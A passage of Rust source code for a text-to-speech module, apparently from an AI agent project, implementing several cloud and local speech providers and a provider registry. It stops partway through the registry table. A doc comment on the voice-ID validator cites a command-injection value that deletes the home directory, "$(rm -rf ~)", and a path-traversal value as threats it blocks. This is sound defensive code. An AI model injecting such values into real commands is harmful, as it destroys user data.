//! Built-in speech providers and the registry that names them.
//!
//! Each provider is a [`TtsProvider`] implementation plus one [`TtsProviderDef`]
//! row in [`PROVIDERS`]. The row carries everything outside the wire protocol
//! — label, key variable, default endpoint/model/voice, input cap — so the
//! engine, `/settings` and the Settings UI all read one table. Adding a
//! provider is a struct, its `impl`, and one row; nothing else changes.
//! Engines that stay outside the binary plug in through the command-backed
//! rows (`custom`, `kittentts`, `neutts`), and any OpenAI-compatible server
//! through the `openai` row's `base_url`.

use std::path::Path;
use std::sync::LazyLock;
use std::time::Duration;

use anyhow::{bail, Context, Result};
use regex::Regex;
use reqwest::Client;

use super::AudioFormat;
use crate::config::{Config, TtsModelConfig};
use crate::media::core::ensure_success;
use crate::media::provider_info::ProviderInfo;

/// Request data for TTS providers.
pub(super) struct SynthesisRequest<'a> {
    pub text: &'a str,
    /// Already resolved by the engine: call → row → `tts.default_voice` →
    /// the provider's catalog default. Empty only for providers without one.
    pub voice: String,
    pub format: AudioFormat,
    pub model: Option<String>,
    pub timeout: Duration,
}

/// Provider-agnostic TTS trait.
#[async_trait::async_trait]
pub(super) trait TtsProvider: Send + Sync {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>>;
    fn name(&self) -> &str;
}

/// Strict voice-ID allowlist for providers that splice `voice` into a URL
/// path or a shell command. The LLM supplies `voice` via tool args, so this
/// is the trust boundary that keeps a hostile `voice = "$(rm -rf ~)"` or
/// `voice = "../admin"` out of shell/URL contexts. Providers that pass voice
/// only inside JSON/SSML bodies (Edge, Gemini, MiniMax, xAI, Mistral, OpenAI,
/// Piper) don't need this — `reqwest`/`serde_json` handle their escaping.
///
/// The character allowlist is `[A-Za-z0-9_.-]` so real-world voice names
/// like `en-US.male.1` still pass. A separate `..` rejection closes
/// path-traversal: `voice = ".."` would otherwise let a model pivot
/// ElevenLabs' `/v1/text-to-speech/{voice}` to a sibling endpoint.
pub(crate) fn validate_voice_id(voice: &str) -> Result<()> {
    if voice.is_empty() {
        bail!("voice id is empty");
    }
    if voice == "." || voice == ".." || voice.contains("..") {
        bail!("invalid voice id (path-traversal pattern): {voice:?}");
    }
    if !voice
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
    {
        bail!("invalid voice id: {voice:?}");
    }
    Ok(())
}

// ── OpenAI TTS Provider ──

/// OpenAI TTS provider (POST /v1/audio/speech).
pub(super) struct OpenAiTtsProvider {
    pub(super) client: Client,
    pub(super) api_key: String,
    pub(super) base_url: String,
    pub(super) default_model: String,
}

#[async_trait::async_trait]
impl TtsProvider for OpenAiTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let model = req.model.as_deref().unwrap_or(&self.default_model);
        let url = format!("{}/v1/audio/speech", self.base_url);

        let body = serde_json::json!({
            "model": model,
            "input": req.text,
            "voice": req.voice,
            "response_format": req.format.extension(),
        });

        let resp = self
            .client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.api_key))
            .json(&body)
            .timeout(req.timeout)
            .send()
            .await?;

        let resp = ensure_success(resp, "OpenAI TTS").await?;

        Ok(resp.bytes().await?.to_vec())
    }

    fn name(&self) -> &str {
        "openai"
    }
}

// ── ElevenLabs TTS Provider ──

/// Map AudioFormat to ElevenLabs output_format query parameter.
fn elevenlabs_format(fmt: AudioFormat) -> &'static str {
    match fmt {
        AudioFormat::Mp3 => "mp3_44100_128",
        AudioFormat::Opus => "opus_16000",
        AudioFormat::Aac => "aac_44100",
        AudioFormat::Flac => "flac_44100",
        AudioFormat::Wav => "pcm_44100",
    }
}

/// ElevenLabs TTS provider (POST /v1/text-to-speech/{voice_id}).
pub(super) struct ElevenLabsTtsProvider {
    pub(super) client: Client,
    pub(super) api_key: String,
    pub(super) base_url: String,
    pub(super) default_model: String,
}

#[async_trait::async_trait]
impl TtsProvider for ElevenLabsTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let model = req.model.as_deref().unwrap_or(&self.default_model);
        validate_voice_id(&req.voice).context("ElevenLabs voice id")?;
        let url = format!(
            "{}/v1/text-to-speech/{}",
            self.base_url.trim_end_matches('/'),
            req.voice
        );

        let body = serde_json::json!({
            "text": req.text,
            "model_id": model,
            "voice_settings": {
                "stability": 0.5,
                "similarity_boost": 0.5,
            },
        });

        let resp = self
            .client
            .post(&url)
            .header("xi-api-key", &self.api_key)
            .query(&[("output_format", elevenlabs_format(req.format))])
            .json(&body)
            .timeout(req.timeout)
            .send()
            .await?;

        let resp = ensure_success(resp, "ElevenLabs TTS").await?;

        Ok(resp.bytes().await?.to_vec())
    }

    fn name(&self) -> &str {
        "elevenlabs"
    }
}

// ── Edge TTS Provider (Microsoft, free, no API key) ──

/// Microsoft Edge "Read aloud" TTS — the same endpoint
/// No API key required; voice resolution is via Microsoft's catalog.
///
/// Backed by the [`msedge_tts`](https://crates.io/crates/msedge-tts)
/// crate which encapsulates the WSS speech.config + SSML protocol with
/// the Sec-MS-GEC header dance that Microsoft now requires.
struct EdgeTtsProvider;

#[async_trait::async_trait]
impl TtsProvider for EdgeTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        use msedge_tts::tts::client::tokio_runtime::connect_async;
        use msedge_tts::tts::SpeechConfig;

        let voice_short = req.voice.clone();
        let text = req.text.to_string();
        let timeout = req.timeout;

        let fut = async move {
            // Microsoft expects the full voice_name like:
            //   "Microsoft Server Speech Text to Speech Voice (en-US, AvaMultilingualNeural)"
            // If the caller already supplied that full form, pass it through;
            // otherwise derive it from the locale-prefixed short name.
            let voice_name = if voice_short.starts_with("Microsoft Server Speech") {
                voice_short.clone()
            } else {
                expand_edge_voice_short_name(&voice_short)
            };
            let cfg = SpeechConfig {
                voice_name,
                audio_format: "audio-24khz-48kbitrate-mono-mp3".to_owned(),
                pitch: 0,
                rate: 0,
                volume: 0,
            };
            let mut client = connect_async()
                .await
                .map_err(|e| anyhow::anyhow!("Edge TTS connect: {e}"))?;
            let audio = client
                .synthesize(&text, &cfg)
                .await
                .map_err(|e| anyhow::anyhow!("Edge TTS synthesize: {e}"))?;
            Ok::<Vec<u8>, anyhow::Error>(audio.audio_bytes)
        };

        match tokio::time::timeout(timeout, fut).await {
            Ok(Ok(bytes)) => Ok(bytes),
            Ok(Err(e)) => Err(e),
            Err(_) => bail!("Edge TTS timed out after {timeout:?}"),
        }
    }

    fn name(&self) -> &str {
        "edge"
    }
}

/// Convert a short voice name like `en-US-AvaMultilingualNeural` into the
/// full Microsoft voice_name accepted by Edge TTS's WSS endpoint:
/// `Microsoft Server Speech Text to Speech Voice (en-US, AvaMultilingualNeural)`.
///
/// Split on the second `-` (after the language and region) so locales with
/// region codes like `pt-BR` round-trip correctly. Falls back to the input
/// untouched on malformed names — the server's error message will then
/// pinpoint the issue.
fn expand_edge_voice_short_name(short: &str) -> String {
    // Find the boundary between locale (lang-REGION) and voice name.
    let mut dash_count = 0;
    let split_at = short.char_indices().find_map(|(i, c)| {
        if c == '-' {
            dash_count += 1;
            if dash_count == 2 {
                return Some(i);
            }
        }
        None
    });
    let Some(idx) = split_at else {
        return short.to_string();
    };
    let locale = &short[..idx];
    let voice = &short[idx + 1..];
    format!("Microsoft Server Speech Text to Speech Voice ({locale}, {voice})")
}

// ── Gemini TTS Provider ──

/// Google Gemini TTS via `generateContent` with `responseModalities: ["AUDIO"]`.
///
/// Gemini returns raw 24 kHz mono 16-bit PCM (L16) as base64 JSON. We wrap
/// it with a WAV RIFF header so downstream players accept it as a normal
/// audio file.
struct GeminiTtsProvider {
    client: Client,
    api_key: String,
    base_url: String,
    default_model: String,
}

/// Fixed by the Gemini TTS API — it returns raw PCM with no container, so the
/// rate can't be sniffed and must be hardcoded to build a valid WAV header.
const GEMINI_TTS_SAMPLE_RATE: u32 = 24_000;

#[async_trait::async_trait]
impl TtsProvider for GeminiTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let model = req.model.as_deref().unwrap_or(&self.default_model);
        let voice = req.voice.clone();
        let url = format!(
            "{}/models/{model}:generateContent",
            self.base_url.trim_end_matches('/')
        );

        let body = serde_json::json!({
            "contents": [{"parts": [{"text": req.text}]}],
            "generationConfig": {
                "responseModalities": ["AUDIO"],
                "speechConfig": {
                    "voiceConfig": {"prebuiltVoiceConfig": {"voiceName": voice}}
                }
            }
        });

        let resp = self
            .client
            .post(&url)
            .query(&[("key", &self.api_key)])
            .header("Content-Type", "application/json")
            .json(&body)
            .timeout(req.timeout)
            .send()
            .await?;

        let resp = ensure_success(resp, "Gemini TTS").await?;

        let json: serde_json::Value = resp.json().await?;
        let parts = json
            .get("candidates")
            .and_then(|c| c.get(0))
            .and_then(|c| c.get("content"))
            .and_then(|c| c.get("parts"))
            .and_then(|p| p.as_array())
            .ok_or_else(|| anyhow::anyhow!("Gemini TTS: candidates[0].content.parts missing"))?;

        let b64 = parts
            .iter()
            .find_map(|p| {
                p.get("inlineData")
                    .or_else(|| p.get("inline_data"))
                    .and_then(|i| i.get("data"))
                    .and_then(|d| d.as_str())
            })
            .ok_or_else(|| anyhow::anyhow!("Gemini TTS: no inlineData.data in response"))?;

        use base64::Engine;
        let pcm = base64::engine::general_purpose::STANDARD
            .decode(b64)
            .map_err(|e| anyhow::anyhow!("Gemini TTS base64 decode failed: {e}"))?;
        // Gemini only emits PCM regardless of req.format — wrap as WAV so
        // the system player accepts it. If the caller requested mp3/opus,
        // they get WAV bytes; downstream conversion (ffmpeg) is the
        // caller's responsibility, matching the behavior at
        // the JSON envelope shape.
        Ok(wrap_pcm_as_wav(&pcm, GEMINI_TTS_SAMPLE_RATE, 1, 16))
    }

    fn name(&self) -> &str {
        "gemini"
    }
}

/// Wrap raw signed-little-endian PCM with a standard WAV RIFF header.
fn wrap_pcm_as_wav(pcm: &[u8], sample_rate: u32, channels: u16, bits: u16) -> Vec<u8> {
    let byte_rate = sample_rate * channels as u32 * (bits / 8) as u32;
    let block_align: u16 = channels * (bits / 8);
    let data_size = pcm.len() as u32;
    let mut out = Vec::with_capacity(44 + pcm.len());
    out.extend_from_slice(b"RIFF");
    out.extend_from_slice(&(36 + data_size).to_le_bytes());
    out.extend_from_slice(b"WAVE");
    out.extend_from_slice(b"fmt ");
    out.extend_from_slice(&16u32.to_le_bytes()); // fmt chunk size
    out.extend_from_slice(&1u16.to_le_bytes()); // PCM
    out.extend_from_slice(&channels.to_le_bytes());
    out.extend_from_slice(&sample_rate.to_le_bytes());
    out.extend_from_slice(&byte_rate.to_le_bytes());
    out.extend_from_slice(&block_align.to_le_bytes());
    out.extend_from_slice(&bits.to_le_bytes());
    out.extend_from_slice(b"data");
    out.extend_from_slice(&data_size.to_le_bytes());
    out.extend_from_slice(pcm);
    out
}

// ── MiniMax TTS Provider ──

/// MiniMax t2a_v2 — nested voice/audio settings, returns hex-encoded MP3
/// in `data.audio`.
struct MiniMaxTtsProvider {
    client: Client,
    api_key: String,
    base_url: String,
    default_model: String,
    /// MiniMax accounts scope requests by GroupId — when present, attached
    /// as `?GroupId=` on the base URL. Resolved from the
    /// `MINIMAX_GROUP_ID` credential at provider construction.
    group_id: Option<String>,
}

#[async_trait::async_trait]
impl TtsProvider for MiniMaxTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let model = req.model.as_deref().unwrap_or(&self.default_model);
        let voice = req.voice.clone();
        let mut url = self.base_url.clone();
        if let Some(gid) = &self.group_id {
            if !url.contains("GroupId=") {
                let sep = if url.contains('?') { "&" } else { "?" };
                url = format!("{url}{sep}GroupId={gid}");
            }
        }

        let body = serde_json::json!({
            "model": model,
            "text": req.text,
            "voice_setting": {"voice_id": voice, "speed": 1.0, "vol": 1.0, "pitch": 0, "emotion": "neutral"},
            "audio_setting": {"sample_rate": 32_000, "bitrate": 128_000, "format": "mp3", "channel": 1}
        });

        let resp = self
            .client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.api_key))
            .header("Content-Type", "application/json")
            .json(&body)
            .timeout(req.timeout)
            .send()
            .await?;

        let resp = ensure_success(resp, "MiniMax TTS").await?;

        let json: serde_json::Value = resp.json().await?;
        let status_code = json
            .get("base_resp")
            .and_then(|b| b.get("status_code"))
            .and_then(serde_json::Value::as_i64)
            .unwrap_or(-1);
        if status_code != 0 {
            let msg = json
                .get("base_resp")
                .and_then(|b| b.get("status_msg"))
                .and_then(|s| s.as_str())
                .unwrap_or("unknown");
            bail!("MiniMax TTS API error (code {status_code}): {msg}");
        }
        let hex_audio = json
            .get("data")
            .and_then(|d| d.get("audio"))
            .and_then(|a| a.as_str())
            .ok_or_else(|| anyhow::anyhow!("MiniMax TTS: data.audio missing"))?;
        decode_hex(hex_audio).ok_or_else(|| anyhow::anyhow!("MiniMax TTS: invalid hex audio data"))
    }

    fn name(&self) -> &str {
        "minimax"
    }
}

fn decode_hex(s: &str) -> Option<Vec<u8>> {
    if !s.len().is_multiple_of(2) {
        return None;
    }
    let mut out = Vec::with_capacity(s.len() / 2);
    for chunk in s.as_bytes().chunks(2) {
        let h = (chunk[0] as char).to_digit(16)?;
        let l = (chunk[1] as char).to_digit(16)?;
        out.push(((h << 4) | l) as u8);
    }
    Some(out)
}

// ── xAI TTS Provider ──

/// xAI Grok TTS — `POST {base}/tts`, returns raw audio bytes (MP3 by
/// default; WAV when `output_format.codec` is set).
struct XaiTtsProvider {
    client: Client,
    api_key: String,
    base_url: String,
    default_language: String,
    default_sample_rate_hz: u32,
    default_bit_rate: u32,
    /// When true, run replies through `apply_xai_auto_speech_tags`
    /// before synthesis so Grok inserts a natural pause between the
    /// opening sentence and the body. Off by default (raw text); flip
    /// for conversational voice-mode replies.
    auto_speech_tags: bool,
}

/// True if `text` already contains explicit xAI speech tags. We leave
/// operator-marked-up text untouched so a deliberate `<whisper>...` is
/// not stripped by the auto-cadence layer. Mirrors the recognised tag
/// vocabulary from the reference implementation.
fn xai_text_has_speech_tags(text: &str) -> bool {
    // Inline tags: `[pause]`, `[laugh]`, `[breath]`, `[uh]`, `[um]`.
    // Wrapping tags: `<whisper>...</whisper>`, `<soft>...`, `<loud>...`,
    // `<singing>...`, `<laugh-speak>...`, `<emphasis>...`.
    static INLINE: &[&str] = &["[pause]", "[laugh]", "[breath]", "[uh]", "[um]", "[sigh]"];
    static WRAPPING: &[&str] = &[
        "<whisper",
        "<soft",
        "<loud",
        "<slow",
        "<singing",
        "<laugh-speak",
        "<emphasis",
    ];
    let lower = text.to_ascii_lowercase();
    INLINE.iter().any(|t| lower.contains(t)) || WRAPPING.iter().any(|t| lower.contains(t))
}

/// Light cadence transform for xAI TTS replies. Conservative on purpose:
/// it only ever *adds* `[pause]` markers around paragraph breaks and after
/// the opening sentence. It never invents whispers or laughter, and it
/// leaves text that already has speech tags untouched (so an operator who
/// hand-crafts a tagged reply gets that exact rendering).
///
/// Mirrors the reference behavior: paragraph break → `[pause]`, single
/// newlines collapse to spaces, then a `[pause]` after the first sentence
/// (12–120 chars terminated by `.`/`!`/`?`/`…`). Final cleanup collapses
/// any double-spaces the transform introduced.
pub fn apply_xai_auto_speech_tags(text: &str) -> String {
    // These four patterns are compile-time-constant literals, so a compile
    // failure is a programmer bug at static-init time, not a runtime risk —
    // same convention as `md_regexes` below. Hoisting them to `LazyLock`
    // compiles each once rather than on every call.
    #[allow(clippy::expect_used)]
    // Paragraph break → explicit pause marker. `(?s)` lets `.` match any
    // newline-inclusive whitespace run between the two `\n`s.
    static PARAGRAPH: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"(?s)\n\s*\n+").expect("paragraph regex"));
    #[allow(clippy::expect_used)]
    static SINGLE_NL: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"\s*\n\s*").expect("single_nl regex"));
    // First-sentence boundary: at least 12 chars, at most 120, ending in
    // `.`/`!`/`?`/`…` and followed by more text. The window prevents a
    // very short greeting ("Hi.") or a wall-of-text paragraph from getting
    // an awkward post-first-sentence pause. The `regex` crate does not
    // support lookaheads, so we capture the following non-whitespace
    // character into `$2` and stitch it back into the replacement —
    // semantically identical to `\s+(?=\S)` but NFA-compatible.
    #[allow(clippy::expect_used)]
    static FIRST_SENTENCE: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r"(?s)^(.{12,120}?[.!?…])\s+(\S)").expect("first_sentence regex")
    });
    #[allow(clippy::expect_used)]
    static EXTRA_WS: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"\s{2,}").expect("extra_ws regex"));

    let clean = text.trim();
    if clean.is_empty() || xai_text_has_speech_tags(clean) {
        return text.to_string();
    }

    let mut out = PARAGRAPH.replace_all(clean, " [pause] ").into_owned();
    out = SINGLE_NL.replace_all(&out, " ").into_owned();
    out = FIRST_SENTENCE.replace(&out, "$1 [pause] $2").into_owned();
    out = EXTRA_WS.replace_all(&out, " ").into_owned();
    out.trim().to_string()
}

#[async_trait::async_trait]
impl TtsProvider for XaiTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let voice = req.voice.clone();
        let url = format!("{}/tts", self.base_url.trim_end_matches('/'));

        // Apply cadence-shaping speech tags only when the operator opted
        // in. Avoids changing the spoken output for callers that supply
        // pre-formatted text or rely on the legacy raw behavior.
        let text_for_synthesis: String = if self.auto_speech_tags {
            apply_xai_auto_speech_tags(req.text)
        } else {
            req.text.to_string()
        };
        let mut body = serde_json::json!({
            "text": text_for_synthesis,
            "voice_id": voice,
            "language": self.default_language,
        });
        // Only send output_format when not the documented default
        // (mp3 + 24kHz + 128kbps).
        let is_wav = matches!(req.format, AudioFormat::Wav);
        if is_wav || self.default_sample_rate_hz != 24_000 || self.default_bit_rate != 128_000 {
            let mut output_format = serde_json::json!({
                "codec": if is_wav { "wav" } else { "mp3" },
                "sample_rate": self.default_sample_rate_hz,
            });
            if !is_wav {
                output_format["bit_rate"] = serde_json::json!(self.default_bit_rate);
            }
            body["output_format"] = output_format;
        }

        let resp = self
            .client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.api_key))
            .header("Content-Type", "application/json")
            .json(&body)
            .timeout(req.timeout)
            .send()
            .await?;

        let resp = ensure_success(resp, "xAI TTS").await?;
        Ok(resp.bytes().await?.to_vec())
    }

    fn name(&self) -> &str {
        "xai"
    }
}

// ── Mistral TTS Provider (Voxtral) ──

/// Mistral Voxtral TTS — `POST {base}/v1/audio/speech` (OpenAI-shape
/// endpoint). Mistral returns a JSON envelope `{ "audio_data": "<b64>" }`
/// rather than raw audio bytes. Format follows the request's
/// `response_format` field — we pick `opus`/`wav`/`flac`/`mp3` based on
/// `req.format` with mp3 as the fallback.
struct MistralTtsProvider {
    client: Client,
    api_key: String,
    base_url: String,
    default_model: String,
}

#[async_trait::async_trait]
impl TtsProvider for MistralTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let model = req.model.as_deref().unwrap_or(&self.default_model);
        let voice = req.voice.clone();
        let response_format = match req.format {
            AudioFormat::Mp3 => "mp3",
            AudioFormat::Opus => "opus",
            AudioFormat::Wav => "wav",
            AudioFormat::Flac => "flac",
            AudioFormat::Aac => "mp3", // Mistral doesn't list AAC; fall back to MP3
        };
        let url = format!("{}/v1/audio/speech", self.base_url.trim_end_matches('/'));

        let body = serde_json::json!({
            "model": model,
            "input": req.text,
            "voice_id": voice,
            "response_format": response_format,
        });

        let resp = self
            .client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.api_key))
            .header("Content-Type", "application/json")
            .json(&body)
            .timeout(req.timeout)
            .send()
            .await?;

        let resp = ensure_success(resp, "Mistral TTS").await?;

        // Mistral's content-type header is application/json; the audio
        // is base64 inside `audio_data`. Some Mistral deployments may
        // return raw bytes — detect by checking the first byte: a JSON
        // response always starts with `{` (0x7B).
        let bytes = resp.bytes().await?.to_vec();
        if bytes.first() == Some(&b'{') {
            let json: serde_json::Value = serde_json::from_slice(&bytes)
                .map_err(|e| anyhow::anyhow!("Mistral TTS: invalid JSON envelope: {e}"))?;
            let b64 = json
                .get("audio_data")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow::anyhow!("Mistral TTS: missing audio_data field"))?;
            use base64::Engine;
            base64::engine::general_purpose::STANDARD
                .decode(b64)
                .map_err(|e| anyhow::anyhow!("Mistral TTS base64 decode failed: {e}"))
        } else {
            Ok(bytes)
        }
    }

    fn name(&self) -> &str {
        "mistral"
    }
}

// ── Piper TTS Provider (local) ──

/// Piper TTS — shells to the local `piper` binary if installed on PATH.
/// The user provides `voice` as either an absolute `.onnx` path or a
/// short name like `en_US-lessac-medium` resolved against
/// `~/.borg/cache/piper-voices/`. Shells to the `piper` CLI to avoid
/// embedding the model loader inside borg.
struct PiperTtsProvider {
    /// Directory holding `{voice}.onnx` + `{voice}.onnx.json` files when
    /// `voice` is given as a short name. Defaults to
    /// `~/.borg/cache/piper-voices/`.
    voices_dir: std::path::PathBuf,
}

#[async_trait::async_trait]
impl TtsProvider for PiperTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let voice = req.voice.clone();
        let model_path = self.resolve_voice_path(&voice)?;
        let text = req.text.to_string();
        let timeout = req.timeout;

        // Shell out off-runtime so a slow voice load doesn't stall tokio.
        tokio::task::spawn_blocking(move || piper_synthesize(&model_path, &text, timeout))
            .await
            .context("piper task panicked")?
    }

    fn name(&self) -> &str {
        "piper"
    }
}

impl PiperTtsProvider {
    fn resolve_voice_path(&self, voice: &str) -> Result<std::path::PathBuf> {
        let p = std::path::PathBuf::from(voice);
        if p.extension().is_some_and(|e| e == "onnx") && p.exists() {
            return Ok(p);
        }
        let cached = self.voices_dir.join(format!("{voice}.onnx"));
        if cached.exists() {
            return Ok(cached);
        }
        bail!(
            "Piper voice '{voice}' not found. Provide an absolute .onnx path, or download \
             into {} (e.g. via `python -m piper.download_voices {voice} --download-dir {}`)",
            self.voices_dir.display(),
            self.voices_dir.display()
        )
    }
}

fn piper_synthesize(model_path: &Path, text: &str, timeout: Duration) -> Result<Vec<u8>> {
    use std::io::Write as _;
    use std::process::{Command, Stdio};

    let piper = which::which("piper")
        .map_err(|_| anyhow::anyhow!("`piper` binary not on PATH — install piper-tts"))?;
    let tmp = tempfile::NamedTempFile::new()?;
    let tmp_path = tmp.path().to_path_buf();

    let mut child = Command::new(piper)
        .arg("-m")
        .arg(model_path)
        .arg("-f")
        .arg(&tmp_path)
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .context("spawn piper")?;
    if let Some(mut stdin) = child.stdin.take() {
        stdin
            .write_all(text.as_bytes())
            .context("write to piper stdin")?;
    }
    let started = std::time::Instant::now();
    loop {
        if started.elapsed() >= timeout {
            let _ = child.kill();
            let _ = child.wait();
            bail!("piper synthesis timed out after {timeout:?}");
        }
        match child.try_wait()? {
            Some(status) => {
                if !status.success() {
                    let mut err = String::new();
                    if let Some(mut s) = child.stderr.take() {
                        use std::io::Read as _;
                        let _ = s.read_to_string(&mut err);
                    }
                    bail!(
                        "piper exited with {:?}: {}",
                        status.code(),
                        err.trim().chars().take(300).collect::<String>()
                    );
                }
                break;
            }
            None => std::thread::sleep(Duration::from_millis(50)),
        }
    }
    std::fs::read(&tmp_path).context("read piper output wav")
}

// ── Custom TTS Provider ──

/// Custom TTS — shells out to an operator-defined command template.
/// Template tokens include `{text_file}`/`{input_path}`, `{voice}`,
/// `{out_path}`/`{output_path}`, `{format}`, `{model}`, and `{speed}`.
/// Returns whatever bytes the command writes to `{out_path}`.
struct CustomTtsProvider {
    name: String,
    /// Command template with custom TTS placeholders.
    command_template: String,
    default_model: String,
    output_extension: String,
}

#[async_trait::async_trait]
impl TtsProvider for CustomTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let voice = req.voice.clone();
        let template = self.command_template.clone();
        let ext = self.output_extension.clone();
        let model = self.default_model.clone();
        let text = req.text.to_string();
        let timeout = req.timeout;

        tokio::task::spawn_blocking(move || {
            custom_synthesize(&template, &text, &voice, &ext, &model, timeout)
        })
        .await
        .context("custom tts task panicked")?
    }

    fn name(&self) -> &str {
        &self.name
    }
}

fn custom_synthesize(
    template: &str,
    text: &str,
    voice: &str,
    extension: &str,
    model: &str,
    timeout: Duration,
) -> Result<Vec<u8>> {
    use std::io::Write as _;
    use std::process::Command;

    // Reject anything outside the strict alphanumeric-plus-`-._` set before
    // rendering the shell template. Empty `voice` is allowed (operator
    // templates that don't reference `{voice}` legitimately leave it unset).
    if !voice.is_empty() {
        validate_voice_id(voice).context("custom TTS voice id")?;
    }

    // Write text to a tempfile so commands can `cat {text_file}` without
    // shell-escaping headaches around quotes/newlines in the prose.
    let mut text_file = tempfile::NamedTempFile::new()?;
    text_file.write_all(text.as_bytes())?;
    text_file.flush()?;
    let text_path = text_file.path().to_string_lossy().into_owned();
    let out_file = tempfile::Builder::new()
        .suffix(&format!(".{extension}"))
        .tempfile()?;
    let out_path = out_file.path().to_string_lossy().into_owned();

    let cmd_str = crate::media::shell_template::render(
        template,
        &[
            ("text_file", &text_path),
            ("input_path", &text_path),
            ("text_path", &text_path),
            ("voice", voice),
            ("out_path", &out_path),
            ("output_path", &out_path),
            ("format", extension),
            ("model", model),
            ("speed", "1.0"),
        ],
    );

    let mut child = Command::new("sh")
        .arg("-c")
        .arg(&cmd_str)
        // Non-interactive: the command reads its text from the rendered
        // argument, not stdin. Inheriting ours would let it swallow the
        // operator's keystrokes or block until the timeout below.
        .stdin(std::process::Stdio::null())
        .spawn()
        .context("spawn custom tts")?;
    let started = std::time::Instant::now();
    loop {
        if started.elapsed() >= timeout {
            let _ = child.kill();
            let _ = child.wait();
            bail!("custom tts timed out after {timeout:?}");
        }
        match child.try_wait()? {
            Some(status) => {
                if !status.success() {
                    bail!("custom tts exited with {:?}", status.code());
                }
                break;
            }
            None => std::thread::sleep(Duration::from_millis(50)),
        }
    }
    std::fs::read(out_file.path()).context("read custom tts output")
}

// ── Registry ──

/// What a registry row's constructor receives: the config row plus the
/// key and endpoint already resolved from the provider's [`ProviderInfo`].
pub(super) struct BuildContext<'a> {
    client: &'a Client,
    row: &'a TtsModelConfig,
    config: &'a Config,
    info: &'static ProviderInfo,
    /// Empty for keyless providers.
    api_key: String,
    base_url: String,
}

impl BuildContext<'_> {
    fn default_model(&self) -> String {
        self.info.default_model.to_string()
    }
}

/// One built-in speech provider.
pub(super) struct TtsProviderDef {
    pub(super) info: ProviderInfo,
    /// Input cap in bytes for the model a row names (`None` = the default).
    pub(super) max_text_length: fn(Option<&str>) -> usize,
    /// `None` when the row is unusable (e.g. a command provider with no
    /// `command`); the engine logs and skips it.
    build: fn(BuildContext<'_>) -> Option<Box<dyn TtsProvider>>,
}

impl TtsProviderDef {
    /// Build this provider for `row`, or `None` when its key is missing or
    /// the row is incomplete.
    pub(super) fn build(
        &'static self,
        client: &Client,
        row: &TtsModelConfig,
        config: &Config,
    ) -> Option<Box<dyn TtsProvider>> {
        let api_key = self.info.api_key(config, row.api_key_env.as_deref())?;
        (self.build)(BuildContext {
            client,
            row,
            config,
            info: &self.info,
            api_key,
            base_url: self.info.base_url_or(row.base_url.as_deref()),
        })
    }
}

/// Command-backed engines share one constructor; the provider id names them
/// unless the row sets `name`.
fn build_command(cx: BuildContext<'_>) -> Option<Box<dyn TtsProvider>> {
    let command_template = cx.row.command.as_deref().filter(|c| !c.trim().is_empty())?;
    Some(Box::new(CustomTtsProvider {
        name: cx
            .row
            .name
            .clone()
            .unwrap_or_else(|| cx.row.provider.clone()),
        command_template: command_template.to_string(),
        default_model: cx.row.model.clone().unwrap_or_default(),
        output_extension: cx
            .row
            .output_extension
            .clone()
            .unwrap_or_else(|| "wav".to_string()),
    }))
}

const fn command_provider(id: &'static str, label: &'static str) -> ProviderInfo {
    ProviderInfo {
        requires_command: true,
        ..ProviderInfo::new(id, label)
    }
}

/// ElevenLabs caps input per model; unknown models get the multilingual cap.
fn elevenlabs_max_text_length(model: Option<&str>) -> usize {
    match model.unwrap_or("eleven_multilingual_v2") {
        "eleven_v3" | "eleven_ttv_v3" => 5_000,
        "eleven_flash_v2" => 30_000,
        "eleven_flash_v2_5" => 40_000,
        _ => 10_000,
    }
}

/// Every built-in speech provider, in picker order.
pub(super) static PROVIDERS: &[TtsProviderDef] = &[
    TtsProviderDef {
        info: ProviderInfo {
            key_env: &["ELEVENLABS_API_KEY"],
            key_url: "https://elevenlabs.io/app/settings/api-keys",
            base_url: "https://api.elevenlabs.io",
            default_model: "eleven_multilingual_v2",
            // "Adam", a premade voice every account can use.
            default_voice: "pNInz6obpgDQGcFmaJgB",
            ..ProviderInfo::new("elevenlabs", "ElevenLabs")
        },
        max_text_length: elevenlabs_max_text_length,
        build: |cx| {
            Some(Box::new(ElevenLabsTtsProvider {
                client: cx.client.clone(),
                default_model: cx.default_model(),
                api_key: cx.api_key,
                base_url: cx.base_url,
            }))
        },
    },
    TtsProviderDef {
        info: ProviderInfo {
            key_env: &["OPENAI_API_KEY"],
            key_url: "https://platform.openai.com/api-keys",
            base_url: "https://api.openai.com",
            default_model: "gpt-4o-mini-tts",
            default_voice: "alloy",
            ..ProviderInfo::new("openai", "OpenAI")
        },
        max_text_length: |_| 4_096,
        build: |cx| {
            Some(Box::new(OpenAiTtsProvider {
                client: cx.client.clone(),
                default_model: cx.default_model(),
                api_key: cx.api_key,
                base_url: cx.base_url,
            }))
        },
    },
    // Microsoft Edge "Read aloud": free, no key; the msedge-tts crate
    // handles the WSS protocol and Sec-MS-GEC header derivation.
    TtsProviderDef {
